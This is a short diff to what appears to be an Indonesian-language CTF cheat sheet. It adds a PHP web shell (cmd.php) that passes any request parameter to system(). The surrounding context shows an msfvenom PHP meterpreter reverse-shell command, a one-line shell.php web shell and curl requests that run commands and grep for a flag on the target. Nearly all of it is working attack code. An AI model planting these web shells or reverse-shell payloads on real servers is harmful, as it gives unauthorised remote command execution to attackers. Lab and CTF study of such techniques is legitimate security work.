@@ -802,6 +802,17 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > payload.php
 
 ```bash
 # Buat & pakai
+cmd.php
+<?php
+if(isset($_REQUEST['cmd'])){
+echo "<pre>";
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+echo "</pre>";
+die;
+}
+?>
+
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 curl "http://target/shell.php?cmd=id"
 curl "http://target/shell.php?cmd=grep+-rR+'NCD{'+/var/www"
